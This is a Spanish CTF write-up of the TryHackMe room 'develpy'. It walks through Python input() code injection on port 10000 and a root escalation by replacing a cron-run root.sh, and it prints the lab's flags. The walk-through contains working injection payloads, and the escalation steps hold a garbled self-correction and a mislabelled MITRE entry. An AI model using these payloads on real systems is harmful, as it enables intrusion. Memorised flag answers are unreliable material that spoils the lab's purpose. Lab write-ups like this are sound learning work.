# Write-up: develpy - TryHackMe

## Resumen del CTF

**Dificultad:** Media  
**Sistema objetivo:** Ubuntu 16.04  
**IP objetivo:** 10.66.150.42  
**Flags:** 2 (User + Root)

---

## Fase 1: Reconocimiento y Enumeración

### Escaneo de puertos

```bash
rustscan -a 10.66.150.42 --ulimit 5000
```

**Puertos descubiertos:**
- 22/tcp - SSH (OpenSSH 7.2p2)
- 10000/tcp - python exploit.py service

### Análisis del servicio en puerto 10000

El servicio `exploit.py` presenta un menú interactivo vulnerable a Python code injection:

```
Private 0days
Please enter number of exploits to send??:
```

El input es evaluado directamente con `input()` en Python, permitiendo ejecución de código arbitrario.

---

## Fase 2: Explotación - Acceso Inicial

### Command Injection

Envío de código Python a través del input vulnerable:

```python
__import__('os').system('whoami')
```

**Resultado:** `king` - Obtenemos acceso como usuario `king`

### Lectura de User Flag

```bash
__import__('os').system('cat /home/king/user.txt')
```

**User Flag:** `cf85ff769cfaaa721758949bf870b019`

---

## Fase 3: Escalada de Privilegios

### Análisis del sistema

Revisión de archivos y configuración:

```bash
# Listar directorio home de king
ls -la /home/king/
# Output: run.sh, root.sh, user.txt, credentials.png, exploit.py

# Ver contenido de run.sh
cat /home/king/run.sh
# Output: Inicia el servicio vulnerable via socat

# Ver contenido de root.sh
cat /home/king/root.sh
# Output: python /root/company/media/*.py

# Ver crontab
cat /etc/crontab
```

**Hallazgo crítico:** El cronjob ejecuta `root.sh` cada minuto como usuario root:

```
* * * * * root cd /home/king/ && bash root.sh
```

### Explotación del Cronjob

Dado que root ejecuta `root.sh` periódicamente, podemos:
1. Eliminar el archivo original (dueño: root, no editable por king)
2.wait! Esperar a que cron ejecute - pero el archivo ya tiene contenido de root

**Corrección:** El archivo root.sh tiene permisos 644 (dueño root), no podemos escribir directamente.

**Solución correcta:**
1. Enviar comando para eliminar y crear nuevo root.sh
2. Esperar ~60 segundos a que cron lo ejecute

```bash
# Paso 1: Eliminar y crear nuevo root.sh
echo "__import__('os').system('rm -f /home/king/root.sh; echo cp /root/root.txt /home/king/root.txt > /home/king/root.sh')" | nc 10.66.150.42 10000

# Paso 2: Esperar ejecución del cron (~60 segundos)
sleep 60

# Paso 3: Verificar flag copiada
ls -la /home/king/root.txt
# Output: -rw-r--r-- 1 root root 33 Apr 18 07:55 /home/king/root.txt
```

### Root Flag

```bash
cat /home/king/root.txt
```

**Root Flag:** `9c37646777a53910a347f387dce025ec`

---

## Técnicas MITRE ATT&CK

| ID | Técnica | Descripción |
|----|---------|-------------|
| T1190 | Exploit Public-Facing Application | Command injection en servicio Python vulnerable |
| T1053 | Scheduled Task/Job | Abuso de cronjob para escalada de privilegios |
| T1547 | Privilege Escalation | Manipulación de archivo ejecutado por cron como root |

---

## Mitigaciones

1. **Validación de input:** Nunca usar `input()` sin sanitización en aplicaciones expuestas
2. **Permisos de archivos:** Archivos ejecutados por cron deben tener permisos restrictivos
3. **Rotación de credenciales:** Cambiar credenciales por defecto en servicios
4. **Monitoreo:** Auditar ejecución de tareas cron y cambios en archivos sensibles

---

## Conclusión

CTF resuelto mediante:
- Python code injection en servicio vulnerable (puerto 10000)
- Manipulación de cronjob para ejecutar código como root
- Tiempo de ejecución: ~2 minutos para root flag